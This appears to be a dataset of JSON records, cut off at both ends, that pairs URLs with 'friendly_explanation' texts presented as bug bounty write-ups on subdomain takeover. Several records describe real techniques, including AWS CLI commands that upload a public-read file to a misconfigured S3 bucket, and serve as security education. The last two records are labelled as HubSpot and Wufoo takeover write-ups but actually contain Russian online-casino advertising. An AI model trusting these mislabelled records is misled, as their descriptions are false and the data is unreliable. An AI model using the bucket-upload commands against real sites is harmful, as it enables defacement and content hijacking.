it went back to the real owner of the email box support@example.com . And here something interesting happened and I decided to write this article. I managed to resolve the forgotten subdomain. Classic subdomain takeover vulnerability. You can read about it in great detail here . I do not know why, but I tried to add a binding to a nonexistent domain. Press enter or click to view image in full size And I did it!!! The subdomain was successfully created/added and I could control the contents of this subdomain!!! And the content was displayed! Press enter or click to view image in full size Wait a minute. How so? After all, the classic subdomain takeover vulnerability only works with already existing subdomains. And we are not allow to make a new one… This situation wasn't clear. Ie, okay, I was able to bypass the levels of validation of my relationship with example.com, which was never be mine (probably thanks to example.com in my account name). But how is it possible to add subdomains at all and control them without any checking components in the DNS A, TXT, CNAME records …? Usually it works like this — we’ll add a subdomain to you, only you prove that you can do it. Go to DNS and add that hash omnomnomtom0110 to TXT. But there was no such thing. Do you want admin.example.com subdomain? No problem! As if the vulnerability — Subdomain Takeover V2. I was able to communicate with the owners of the hosting service being tested and they opened a bit pandora’s box. It turned out the following. Hosting worked through CloudFlare. And he worked in a very tricky way. I will try to explain you in simple words. Roughly speaking, I am tell you, go to me, I will host you. Just delegate your domains to me. And then all incoming calls I send to CloudFlare, considering them to be correct. And if I was entrusted with the president.com domain, and one neighbour came and did a website with notour.president.com and also gave it to me for hosting, then my server, having access to CloudFlare and already having all rights to president.com , will add third level domain for a neighbour quickly and without any question. For all DNS informations which came from CloudFlare are correct. And CloudFlare trusts me as a Hoster. Of course, most hosting providers configure their own DNS services. But that company just transferred everything to CloudFlare from one configured user. So we have a Subdomain Takeover V2. For sure this worked only with those addresses that are already controlled by Hosting service. But in conjunction with the previously discovered admin service — this could play expensive joke with both the Hoster and the hosting service clients. At the moment, almost all critical vulnerabilities and bugs have been fixed. And I hope that no one else will decide to make such architectural delights after reading this story. Security Hacking Bug Bounty Information Security Hosting -- -- 2 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Valeriy Shevchenko 1.91K followers · 151 following I am a guy passionate about testing and security researching 👨‍💻 → t.me/valyaroller Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@prial261/subdomain-takeover-dew-to-missconfigured-project-settings-for-custom-domain-46e90e702969", "title": "Subdomain takeover dew to missconfigured project settings for Custom domain . | by Prial Islam Khan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@prial261/subdomain-takeover-dew-to-missconfigured-project-settings-for-custom-domain-46e90e702969. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain takeover dew to missconfigured project settings for Custom domain . | by Prial Islam Khan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Subdomain takeover dew to missconfigured project settings for Custom domain . Prial Islam Khan 3 min read · Oct 25, 2018 -- 1 Listen Share Hi readers , Today I will write about Subdomain takeover . It’s a common Security issue what is actually developers mistake when they left a Unused/unclaimed 3rd party Service DNS CNAME record for a subdoamin of theirs and Hackers can claim those subdomains with the help of external services it pointing to what could lead to serious issues . You can learn more about Subdomain takeover from detectify blog . While testing flock.com I got a domain flock.co what is under flock company . So I stared looking at it’s subdomains and got subdomain newdev.flock.co . When I visited the subdomain in browser I got a error like below screenshot :- Press enter or click to view image in full size Error Page This took my attention . So I checked the DNS record for this domain . $ dig newdev.flock.co ; <<>> DiG 9.10.6 <<>> newdev.flock.co ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13182 ;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;newdev.flock.co. IN A ;; ANSWER SECTION: newdev.flock.co. 299 IN CNAME cname.readme.io. cname.readme.io. 299 IN CNAME readme-cache-prod-1392018356.us-east-1.elb.amazonaws.com. readme-cache-prod-1392018356.us-east-1.elb.amazonaws.com. 59 IN A 52.0.214.29 readme-cache-prod-1392018356.us-east-1.elb.amazonaws.com. 59 IN A 52.5.249.117 ;; Query time: 69 msec ;; SERVER: 8.8.8.8#53(8.8.8.8) ;; WHEN: Mon Jul 09 04:58:06 +06 2018 ;; MSG SIZE rcvd: 175 From above record we can say the subdomain is pointing to CNAME cname.readme.io . So I start looking at custom domain documents on readme.io website to understand how they works . From their document I understand that :- You need a subdomain pointing to your readme.io subdomain [ yoursubdomain.readme.io ] . Your subdomain should be configured in domains settings in following page https://dash.readme.io/project/<project _Name>/v1.0/domains So to takeover I need to check if cname.readme.io is alreday claimed of not . But Unfortunately it was already claimed :( . But I have seen many such services doesn’t force users to verify their ownership of domains by using same CNAME txt record like their service subdomain . So still there’s a hope . I opened a account in readme.io and I got a subdomain newdev.readme.io . Then I go to domains settings https://dash.readme.io/project/newdev/v1.0/domains and in Custom Domain Field used newdev.flock.co as value and save changes . Now when I visited newdev.flock.co It redirected me to http://newdev.flock.co/inactive this page what saying now that Not Yet Active. Press enter or click to view image in full size See page title ;) This is showing as I am using a trail account . In the webpage title you will see my project name what I used while creating the project . So now this domain is serving my contents from newdev.readme.io project page . How to avoid such issues ? :- Always update your DNS records . remove CNAME or any other DNS records what is not in used . If you find a security vulnerability feel free to contact them via security@flock.com Thanks for reading . You can find me on Facebook anytime :- https://www.facebook.com/prial261 Ethical Hacking Bug Bounty Subdomain Takeover Flock Security -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Prial Islam Khan 1.1K followers · 258 following A teenager boy with passion of Breaking Security . Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/", "title": "Subdomain Takeover via Unsecured S3 Bucket Connected to the Website - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover via Unsecured S3 Bucket Connected to the Website - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 24, 2018 Share BugBounty POC 7 Subdomain Takeover via Unsecured S3 Bucket Connected to the Website by MuhammadKhizerJaved Hey Guys, So This Blog is Basically About an issue i found in a web where a missing file and an Unsecured S3 Bucket connected to that website gave me a way to takeover that subdomain without a Subdomain Takeover Vulnerability, So Let’s begin So I was testing a private program when i came across a Subdomain on the website that was giving a “404 Not found Error” But another Part of The Error was also telling something that was “Code:NoSuchKey” and the Key was “Key:_redirect.html” Now As Most of You guys already know that Every 404 Error does not mean that the subdomain is vulnerable to subdomain takeover and in this case the Issue was that a File Named _redirect.html was missing on the website but seeing the particular Error and the site info i was sure that the site is running on Amazon Service which means that the content for this website should be on an S3 Bucket So I used the subdomain as the Name of the S3 Bucket and got this as a response Now This Error Showed me that the Website is Indeed Connected to an S3 Bucket that is secured and doesn’t allow listing files on the bucket, But what about AWS Cli Sometimes Buckets that gives Access Denied Error on the web page are still accessible via AWS Cli so i tried the command root@kali:~# aws s3 ls s3://sl.target.com/ An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied But unfortunately this didn’t work and i wasn’t able to see files on the bucket but what about Copying/Uploading a File to this S3 Bucket? so I ran the command root@kali:~# aws s3 cp Hacked.txt s3://sl.target.com/ upload: ./Hacked.txt to s3://sl.target.com/Hacked.txt And BOOM!! 💥 Now i have Access to Bucket via Cli and i was able to upload any file i want to upload to the website via this s3 Bucket Bug: Now the issue was simple i found an S3 Bucket that didn’t have a proper policy set so anyone with access to aws cli can upload a file to the bucket. But what else an attacker can do? So Now as You know from starting there was a file _redirect.html was missing on the bucket that was set as index to that subdomain. So I created a File named _redirect.html and uploaded the file to the bucket via cli but now the error on bucket and the subdomain was changed to Access Denied 🤦‍♂️ root@kali:~# aws s3 cp _redirect.html s3://sl.target.com/ upload: ./Hacked.txt to s3://sl.target.com/_redirect.html Issue: I was able to find the s3 bucket connected with the website that provide content to the website and the bucket was insecure and had not properly configured so anyone with access to aws cli can upload, delete files from the bucket. But Uploading a File simply uploaded but due to default behaviour of the current policy the files are not accessible 😒 I was Confused what i should do now. So I decided to read AWS Cli documentations to learn about it more and after a few web pages i was able to find a solution to the issue Uploading Files again and granting permission to files: So I uploaded the files again to the bucket but this time i grant the read access to the files i uploaded and grant read access to AllUsers by command root@kali:~# aws s3 cp _redirect.html s3://sl.target.com/ –grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers upload: ./_redirect.html to s3://sl.target.com/_redirect.html After Uploading this File to the Bucket and granting Read Permission to AllUsers to this File I went to the subdomain itself and this time The Error was Gone on the Subdomain and My file _redirect.html was executed as Index So That’s all i did to takeover a subdomain without an actual subdomain takeover vulnerability but instead with an insecure bucket connected to the subdomain Thanks For Reading 💖 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC Subdomain Takeover MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 7 replies on “Subdomain Takeover via Unsecured S3 Bucket Connected to the Website” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: June 26, 2020 at 7:22 am […] Subdomain takeover via unsecured s3 bucket […] Loading... Reply Guide 001 |Getting Started in Bug Bounty Hunting.. – Muhammad Khizer Javed says: January 22, 2020 at 9:43 am […] Subdomain Takeover via Unsecured S3 Bucket Connected to the Website by Muhammad khizer Javed […] Loading... Reply Getting Started in Bug Bounty Hunting | Complete Guide says: August 30, 2019 at 11:18 am […] Subdomain Takeover via Unsecured S3 Bucket Connected to the Website Muhammad khizer Javed […] Loading... Reply Mohamed Serwah says: February 3, 2019 at 6:02 pm Great WriteUp Loading... Reply raj says: October 23, 2018 at 1:16 am your good bug hunter Loading... Reply Hackers Creed says: October 6, 2018 at 4:31 pm awesomeness overloaded !!! ! Loading... Reply tony says: October 5, 2018 at 1:52 pm What policy weakness do you think allowed write access to the S3 bucket via CLI? Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Privilege Escalation like a Boss Previous IDOR User Account Takeover By Connecting My Facebook Account with victims Account You may also like April 19, 2023 by MuhammadKhizerJaved How I Manipulated My Rank on the Bugcrowd Platform This vulnerability on the Bugcrowd platform allowed manipulating rank on the platform using the API. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More September 10, 2018 by MuhammadKhizerJaved Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC Hey guys Me again with a Short POC about Login Bypass Using SQL Injection to get Access to AutoTraders Webmail so lets begain the POC will be short. What happened... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 3 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://www.mohamedharon.com/2019/02/subdomain-takeover-via-hubspot.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/02/subdomain-takeover-via-hubspot.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://www.mohamedharon.com/2019/02/subdomain-takeover-via-wufoo-service-in.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/02/subdomain-takeover-via-wufoo-service-in.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные 